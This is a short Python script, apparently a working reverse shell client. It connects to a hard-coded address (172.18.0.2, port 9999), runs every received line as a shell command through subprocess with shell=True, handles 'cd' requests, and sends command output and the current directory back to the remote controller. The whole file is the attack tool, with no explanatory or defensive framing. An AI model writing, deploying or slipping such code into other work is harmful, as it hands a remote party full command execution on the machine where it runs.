import socket
import os
import subprocess

s = socket.socket()
host = '172.18.0.2'
port = 9999
s.connect((host, port))
while 1:
    data = s.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        # Sends The Commands Back To The User
        output_byte = cmd.stderr.read() + cmd.stdout.read()
        output_str = str(output_byte, 'utf=8')
        cwd = f'{os.getcwd()}> '
        s.send(str.encode(output_str + cwd))
        print(output_str)
